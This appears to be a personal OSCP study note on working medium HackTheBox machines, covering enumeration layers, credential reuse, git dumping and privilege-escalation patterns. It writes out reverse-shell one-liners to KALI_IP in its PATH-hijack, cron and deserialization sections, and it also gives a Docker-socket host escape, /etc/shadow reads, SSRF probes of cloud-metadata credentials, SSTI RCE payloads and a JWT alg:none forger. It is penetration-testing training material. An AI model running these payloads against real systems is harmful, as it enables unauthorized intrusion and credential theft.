---
tags: [oscp-journey, spectre, stage-4, htb, medium-machines, methodology]
module: 4
cert-stage: oscp
difficulty: intermediate
date: 2026-04-08
phantom-refs: []
netgod-refs: []
---

# S4-04 — Medium Machine Approach

## What Makes a Machine "Medium"

Medium machines build on Easy fundamentals but add complexity at every phase:

- **Harder enumeration:** The attack path is not obvious from initial Nmap output. You need deeper enumeration of each service.
- **Chained vulnerabilities:** Foothold requires 2–3 steps (e.g., credential from one service → access to another service → RCE)
- **Less obvious PrivEsc:** The vector isn't `sudo -l` returning something obvious — it requires reading LinPEAS/WinPEAS carefully or finding a subtle misconfiguration
- **More rabbit holes:** Medium machines often have multiple interesting-looking services, only one of which is the actual path
- **Custom applications:** Proprietary or less-common software that requires source code analysis or manual testing

**Expected time:** 90–120 minutes for a well-prepared candidate. If you're over 2 hours and haven't got a foothold, you've missed something in enumeration.

---

## Key Differences in Approach vs Easy

### Difference 1 — Spend More Time on Web Enumeration

Easy machines: gobuster with `common.txt` finds the attack path.
Medium machines: often require `raft-medium-words.txt` or larger, multiple extension sets, and virtual host enumeration.

```bash
# Layer 1 — Quick (start immediately):
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,bak,zip -t 50 -o gobuster_layer1.txt

# Layer 2 — Medium (start while Layer 1 runs):
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -x php,html,txt,bak,old,zip,tar.gz -t 50 -o gobuster_layer2.txt

# Layer 3 — VHost (always attempt on Medium):
ffuf -u http://TARGET_IP -H "Host: FUZZ.domain.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs BASELINE_SIZE -o vhosts.txt

# Layer 4 — Tech-specific (after fingerprinting):
# Spring Boot:
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
# API discovery:
gobuster dir -u http://TARGET/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
```

### Difference 2 — Read Every Page's Source Code

Medium machines hide paths, credentials, and hints in:
- HTML comments: `<!-- TODO: remove debug endpoint /api/v1/admin -->`
- JavaScript files: API endpoints, hardcoded credentials, business logic
- Error pages: Technology stack details, file paths, internal IPs
- SSL certificate SAN fields: Additional hostnames

```bash
# Dump and search all JS files:
curl -s http://TARGET/ | grep -oP 'src="[^"]*\.js"' | while read -r src; do
    url=$(echo $src | grep -oP 'http[^"]*' || echo "http://TARGET$(echo $src | grep -oP '/[^"]*')")
    curl -s "$url" >> all_js.txt
done
cat all_js.txt | grep -i "pass\|key\|secret\|token\|api\|endpoint\|admin"

# Check SSL cert for alternative names:
echo | openssl s_client -connect TARGET:443 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative"
```

### Difference 3 — Test Every Input Field in Burp

On Easy machines, you often find the vulnerability immediately. On Medium machines, you need to manually test:
- Every form field
- Every URL parameter
- Every header the app processes (User-Agent, Referer, X-Forwarded-For, Cookie values)
- HTTP methods (PUT, DELETE, PATCH, OPTIONS on every endpoint)

```bash
# Find all parameters with Param Miner (Burp extension) or arjun:
arjun -u http://TARGET/endpoint --get -t 10
arjun -u http://TARGET/endpoint --post -t 10

# Test HTTP methods:
curl -X OPTIONS http://TARGET/api/users -v
curl -X PUT http://TARGET/api/users/1 -d '{"admin":true}'
curl -X DELETE http://TARGET/api/users/1
```

### Difference 4 — Credential Reuse Is Almost Always Required

Medium machines rarely give you a single service that immediately yields SYSTEM/root. The typical pattern is:

```
Service A → credential → Service B → foothold → PrivEsc
```

**Credential reuse checklist:**
```bash
# Every credential found — try against ALL services:
# Found user:password in a config file?

# Try SSH:
ssh user@TARGET

# Try FTP:
ftp TARGET  # login as user:password

# Try SMB:
smbclient -L //TARGET -U user%password

# Try web app logins:
curl -c cookies.txt -b cookies.txt -X POST http://TARGET/login \
  -d "username=user&password=password"

# Try database:
mysql -h TARGET -u user -ppassword
impacket-mssqlclient user:password@TARGET

# Try WinRM:
evil-winrm -i TARGET -u user -p password
```

### Difference 5 — Check Git Repositories

Many Medium machines expose a `.git` directory or a GitLab/Gitea instance. Git repositories often contain:
- Historical credentials (deleted from current code but visible in commits)
- Configuration files with database credentials
- Source code revealing SQL injection or authentication bypass

```bash
# Check for .git exposure:
curl http://TARGET/.git/HEAD
# If it returns "ref: refs/heads/master" → .git is exposed

# Dump the repository:
git-dumper http://TARGET/.git /tmp/git_dump
cd /tmp/git_dump

# Check git history for credentials:
git log --all --oneline
git show COMMIT_HASH    # Show specific commit
git log -p | grep -i "pass\|secret\|key\|token\|password" -A2 -B2

# Search all branches:
git branch -a
git log --all -p | grep -i "password"
```

### Difference 6 — Non-Standard Ports Are the Path

Medium machines frequently have the vulnerable service on an unusual port:
- Web app on 8000, 8888, 9000, 3000, 5000
- API on 4000, 7000
- Custom service on random high ports

```bash
# ALWAYS run full port scan:
nmap -p- -T4 --min-rate 5000 -Pn -oA full TARGET &

# When full scan completes — immediately enumerate new discoveries:
# Found port 3000? → curl http://TARGET:3000 (likely Node.js/Express)
# Found port 5000? → curl http://TARGET:5000 (Flask, common API)
# Found port 8888? → curl http://TARGET:8888 (Jupyter, custom web app)
```

---

## Medium Machine Enumeration — The Full Checklist

Run through this systematically before attempting any exploit:

```
WEB ENUMERATION:
□ whatweb + curl -I (tech fingerprint)
□ robots.txt, sitemap.xml, .git/HEAD, .env, crossdomain.xml
□ gobuster: common.txt (all extensions)
□ gobuster: raft-medium-words.txt (all extensions)
□ vhost: ffuf with Host header fuzzing
□ JavaScript analysis: grep for endpoints, creds, API keys
□ SSL cert SAN field (if HTTPS)
□ Every page source viewed manually
□ Every form tested with basic injection
□ HTTP method testing on interesting endpoints
□ Param Miner / arjun on interesting endpoints

SMB ENUMERATION (if 445 open):
□ Null session: smbmap -H TARGET
□ enum4linux-ng TARGET
□ smb-vuln-ms17-010 (even if OS is new — worth checking)
□ smb2-security-mode (for relay potential)
□ All shares explored recursively

DNS (if 53 open):
□ Zone transfer: dig axfr @TARGET domain.local
□ Subdomain brute: gobuster dns

OTHER SERVICES:
□ Every port tested with nc banner grab
□ Every service searchsploited with exact version
□ Default credentials tried on every service UI
```

---

## Medium Machine PrivEsc — Extra Steps

Medium PrivEsc often requires one of these beyond the Easy basics:

### Docker / Container Escape

```bash
# Check if you're in a container:
ls -la /.dockerenv          # Exists? → in Docker
cat /proc/1/cgroup | head   # Contains "docker" → in container
hostname                    # Random hex string → often container

# If in Docker — check for mounted sockets or volumes:
ls -la /var/run/docker.sock    # If accessible → escape!
find / -name docker.sock 2>/dev/null

# Docker socket escape:
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
# If returns data → you can control Docker
# Create a new container mounting host filesystem:
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}],"HostConfig":{"Binds":["/:/host"]}}' \
  http://localhost/containers/create
# Start it and exec into it
```

### PATH Hijacking (More Complex)

```bash
# Find scripts called by root without full paths:
pspy64 → watch for: /usr/bin/python script.py OR cd /opt && python run.py

# If python is called without full path:
echo '#!/bin/bash' > /tmp/python
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> /tmp/python
chmod +x /tmp/python
export PATH=/tmp:$PATH
# Wait for cron to trigger
```

### Writable /etc/cron.d File

```bash
ls -la /etc/cron.d/
# If any cron.d file is writable:
echo "* * * * * root bash -i >& /dev/tcp/KALI_IP/4444 0>&1" >> /etc/cron.d/writable_job
nc -lvnp 4444
# Wait 1 minute
```

### Capabilities Escalation

```bash
getcap -r / 2>/dev/null
# Look for: cap_setuid, cap_net_raw, cap_dac_read_search

# python3 + cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl + cap_setuid:
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'

# openssl + cap_dac_read_search (read any file):
openssl enc -in /etc/shadow
```

### Internal Service Exploitation

```bash
# After getting foothold — check internal services:
ss -tulpn | grep 127.0.0.1

# Port forward to Kali and enumerate:
ssh -L 8080:127.0.0.1:8080 user@TARGET    # If SSH available
# OR use chisel/ligolo for non-SSH scenarios

# Then from Kali:
curl http://127.0.0.1:8080/
gobuster dir -u http://127.0.0.1:8080 -w common.txt
# Internal services often have weaker auth or additional vulnerabilities
```

---

## Medium Machine Patterns — What to Expect

### Pattern 1 — Credential Chain

```
Enumeration finds: FTP backup file → web app config → DB password → SSH login → PrivEsc
```
Every credential feeds the next step. Document ALL credentials as you find them.

### Pattern 2 — API + JWT / Session Manipulation

```
Web app uses API → JWT token found → decode → modify claim → re-sign or none algorithm → admin access
```

```bash
# Decode JWT without signature verification:
echo "JWT_PAYLOAD" | base64 -d    # Decode the payload section

# Check for "alg: none" bypass:
# Create token with alg:none — many old implementations accept it
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"
```

### Pattern 3 — SSRF → Internal Service

```
Web parameter takes URL → SSRF → reach internal services → cloud metadata → credentials
```

```bash
# Test for SSRF:
curl http://TARGET/fetch?url=http://KALI_IP/test    # Do you receive a request?
# If yes → SSRF confirmed

# Try internal services:
curl http://TARGET/fetch?url=http://127.0.0.1:8080/
curl http://TARGET/fetch?url=http://127.0.0.1:3306/
# Try cloud metadata:
curl http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/
curl http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Pattern 4 — Deserialization → RCE

```
Application uses Java, PHP, Python serialized data → modify and send malicious serialized object → RCE
```

```bash
# Java deserialization:
# Install ysoserial: github.com/frohoff/ysoserial
java -jar ysoserial.jar CommonsCollections6 "bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'" | \
  base64 -w0 | xclip

# PHP deserialization:
# Find class with __wakeup(), __destruct() that executes commands
# Craft malicious serialized object

# Python pickle:
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/KALI_IP/4444 0>&1',))
# Serialize and send
```

### Pattern 5 — Template Injection (SSTI)

```
Input reflected into template engine → SSTI → RCE
```

```bash
# Test payloads (try each in input fields):
{{7*7}}         → If returns 49: Jinja2/Twig
${7*7}          → If returns 49: FreeMarker/Pebble
<%= 7*7 %>      → ERB (Ruby)
{{7*'7'}}       → If returns 7777777: Jinja2 specifically

# Jinja2 RCE:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['os'].popen('id').read()}}

# Twig RCE:
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## The Medium Machine 25-Minute Rule — Extended Version

For Medium machines, the rule is stricter because rabbit holes are more elaborate:

**After 25 minutes on any single vector with zero measurable progress:**
1. Document what you tried (exact commands and outputs)
2. Write: "Vector X — no progress after 25 min. Moved to Y."
3. Switch to the next enumeration layer
4. Return to the original vector only after exhausting others

**Signs you're in a rabbit hole on Medium:**
- The vulnerability requires very specific conditions that you're not sure are met
- Every step requires more steps with no clear endpoint
- The attack has been working "in theory" for 20 minutes
- You're Googling increasingly specific phrases with no results

**The reset technique:**
If you've been on a machine for 90 minutes with no foothold:
1. Stop everything
2. List every port/service again from your notes
3. For each service: "Have I actually confirmed the version? Have I tried default creds? Have I searchsploited the EXACT version?"
4. Look for the service you dismissed as "probably nothing" — that's usually the path

---

## Quick Reference — Medium vs Easy Differences

| Area | Easy | Medium |
|------|------|--------|
| Gobuster wordlist | common.txt | raft-medium-words.txt |
| VHost enumeration | Optional | Required |
| JavaScript analysis | Check source | Full grep for endpoints/creds |
| Credential reuse | Sometimes | Almost always required |
| Git repositories | Rare | Common |
| Non-standard ports | Uncommon | Very common |
| PrivEsc complexity | 1 step | 2+ steps, less obvious |
| Time to root | 30–60 min | 90–120 min |
| Rabbit holes | 1–2 | 3–5 |

---

## Common Mistakes on Medium Machines

> [!warning] Medium machine mistakes
> 1. **Using only common.txt for gobuster.** Medium machines are specifically designed so common.txt won't find the attack path. Always layer up to raft-medium-words.txt.
> 2. **Not enumerating virtual hosts.** A plain IP with a default IIS/nginx page often has a vhost like `dev.target.htb` or `admin.target.htb` running a vulnerable app. This is one of the most common missed paths.
> 3. **Not trying credential reuse at every step.** The password in `/var/www/html/config.php` might also be the root password, the SSH password, or the SMB password. Try every found credential everywhere.
> 4. **Ignoring JavaScript files.** Medium machines frequently hide API endpoints, auth tokens, or credentials in `.js` files. Pull and grep every JS file.
> 5. **Not checking git history.** An exposed `.git` directory is useless if you only check the current code. `git log -p` shows all commits including deleted credentials.
> 6. **Spending too long on one service.** Medium machines have deliberate distractors — a service that looks vulnerable but isn't, designed to waste your time. Apply the 25-minute rule strictly.

---

## Practice Resources — Medium Machines to Do in Order

| Machine | Key Techniques | Why It's Good Practice |
|---------|---------------|----------------------|
| HTB — Knife | PHP 8.1.0-dev backdoor, sudo knife | Simple medium — good transition from Easy |
| HTB — Horizontall | API discovery → Strapi CVE → Laravel → privesc | API enumeration pattern |
| HTB — Delivery | Email + chat → credential reuse | Credential chain pattern |
| HTB — Driver | SCF file attack → Responder → SMB relay | Windows credential capture |
| HTB — Writer | SQLi + SSRF + filter bypass chain | Multi-step web exploitation |
| HTB — Cap | IDOR → pcap download → credentials | Non-obvious enumeration |
| HTB — ScriptKiddie | Template injection → reverse shell | SSTI pattern |
| HTB — Secret | JWT manipulation + git history | JWT + git pattern |
